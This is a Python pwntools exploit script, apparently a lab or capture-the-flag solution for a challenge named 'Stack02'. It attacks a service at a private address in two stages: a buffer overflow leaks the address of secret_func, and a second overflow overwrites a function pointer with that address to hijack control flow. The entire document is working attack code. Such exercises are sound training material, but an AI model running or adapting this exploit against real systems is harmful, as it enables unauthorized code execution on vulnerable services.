from pwn import * 
IP = '192.168.14.91' 
PORT = 20002

def main():
    log.info('Stack02 Exploit!') 
    p = log.progress('Leaking secret_func')
    overflow_funcptr = 8 

    # Step 1 - Press Vulnerable Button
    log.info('[1] Press Vulnerable Button Before Proceeding')
    pause()
    payload = cyclic(overflow_funcptr) + pack(0x1337, word_size=32) + 'A'*3 
    r = remote(host=IP, port=PORT) 
    r.sendline(payload) 
    resp = r.recvline() 
    #print '[*] resp: {}'.format(resp) 
    leak = r.recv(4) 
    secret_func_addr = unpack(leak, word_size=32) 
    p.success('{}'.format(hex(secret_func_addr)))
    r.recvall(timeout=1)

    # Step 2 - Press Vulnerable Button
    p = log.progress('Overwriting func_ptr')
    log.info('[2] Press Vulnerable Button Before Proceeding')
    pause()
    r = remote(host=IP, port=PORT) 
    payload = cyclic(overflow_funcptr) + pack(secret_func_addr, word_size=32) + 'AAA' 
    r.sendline(payload) 
    r.recvall(timeout=1)
    p.success("Done!")

if __name__ == '__main__':
    main()
